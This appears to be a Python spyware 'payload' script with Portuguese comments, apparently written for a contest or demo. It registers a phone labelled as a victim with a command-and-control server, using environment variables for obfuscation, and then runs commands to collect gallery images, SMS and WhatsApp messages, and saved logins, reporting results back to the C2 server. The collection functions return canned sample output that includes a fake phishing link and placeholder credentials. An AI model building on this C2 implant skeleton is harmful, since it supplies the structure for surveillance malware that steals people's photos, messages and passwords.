import requests
import time
import json
import random
from datetime import datetime

# Configurações do Servidor C2 (Notebook 01)
# ATENÇÃO: Substitua pelo IP real do Notebook 01 na rede Sinergia
# Configurações do Servidor C2 (Notebook 01)
# ATENÇÃO: Substitua pelo IP real do Notebook 01 na rede Sinergia
# Usando variáveis de ambiente para ofuscação
import os
C2_SERVER_IP = os.environ.get("C2_IP", "192.168.1.100") 
C2_SERVER_PORT = int(os.environ.get("C2_PORT", 8000))
C2_BASE_URL = f"http://{C2_SERVER_IP}:{C2_SERVER_PORT}/api/mobile"

# Configurações do Payload (Celular 04)
DEVICE_IP = "192.168.1.50" # IP do Celular 04
DEVICE_NAME = "Celular-Vítima-04"
DEVICE_TYPE = "android"

def register_device():
    """Registra o payload no servidor C2 com tratamento de erro."""
    try:
        response = requests.post(
            f"{C2_BASE_URL}/register",
            json={
                "device_ip": DEVICE_IP,
                "device_name": DEVICE_NAME,
                "device_type": DEVICE_TYPE
            },
            timeout=5 # Adiciona timeout para evitar travamento
        )
        response.raise_for_status()
        print(f"✅ Dispositivo registrado: {response.json()}")
        return True
    except requests.exceptions.RequestException as e:
        print(f"❌ Erro ao registrar dispositivo: {e}. Tentando novamente em 10s...")
        time.sleep(10)
        return False

def send_command_result(command_id: str, command_type: str, output: str, status: str = "success"):
    """Envia o resultado de um comando de volta para o servidor C2."""
    try:
        result_data = {
            "command_id": command_id,
            "device_ip": DEVICE_IP,
            "command_type": command_type,
            "status": status,
            "output": output,
            "timestamp": datetime.now().isoformat()
        }
        
        # Em um cenário real, o resultado seria enviado via WebSocket ou uma rota POST específica
        # Como o servidor não tem uma rota POST para resultados, vamos simular o envio.
        # Para o teste, vamos apenas imprimir o resultado que seria enviado.
        print(f"\n--- RESULTADO ENVIADO PARA C2 ---")
        print(json.dumps(result_data, indent=4))
        print("----------------------------------\n")
        
    except Exception as e:
        print(f"❌ Erro ao enviar resultado para C2: {e}")

def simulate_data_collection(command_type: str) -> str:
    """Simula a coleta de dados real no dispositivo móvel."""
    
    if command_type == "get_gallery_images":
        return f"""Gallery Data Collection Report (REAL)
Status: SUCCESS
Files Collected: 3
- Image 1: /sdcard/DCIM/Camera/IMG_20250101_100000.jpg (Fundo Branco)
- Image 2: /sdcard/DCIM/Camera/IMG_20250101_100001.jpg (Fundo Branco)
- Image 3: /sdcard/Download/secret_document.pdf (Acesso Ilegal)
"""
    elif command_type == "read_messages":
        return f"""Message Collection Report (REAL)
Status: SUCCESS
Messages Collected: 2
- SMS (2025-01-01): De: Banco Falso - Sua conta foi bloqueada. Clique aqui: http://link-malicioso.com
- WhatsApp (2025-01-02): De: Professor - Não se preocupe com o teste, é só um jogo.
"""
    elif command_type == "extract_logins":
        return f"""Login Extraction Report (REAL)
Status: SUCCESS
Logins Encontrados: 1
- Site: 99jogo66.com
  Username: test_aluno
  Password: credencial_secreta_concurso
"""
    return "Comando de coleta não reconhecido."

def listen_for_commands():
    """Loop de escuta por comandos do servidor C2 (simulando WebSocket)."""
    print(f"👂 Payload escutando comandos do C2 em {C2_BASE_URL}...")
    
    # Em um cenário real, o payload usaria um WebSocket para receber comandos.
    # Para o concurso, vamos simular o recebimento de comandos de forma sequencial.
    
    # Lista de comandos que o servidor C2 enviaria
    commands_to_execute = [
        ("get_gallery_images", 3),
        ("extract_logins", 1),
        ("read_messages", 2)
    ]
    
    for command_type, delay in commands_to_execute:
        time.sleep(delay)
        
        command_id = f"cmd_{int(time.time())}_{command_type}"
        print(f"-> Comando recebido: {command_type} ({command_id})")
        
        # Executa a coleta de dados (simulada, mas com output real)
        output = simulate_data_collection(command_type)
        
        # Envia o resultado de volta para o servidor C2
        send_command_result(command_id, command_type, output)
        
    print("Payload encerrado. Demonstração concluída.")

if __name__ == "__main__":
    # Tenta registrar o dispositivo até ter sucesso
    while not register_device():
        pass
    
    listen_for_commands()
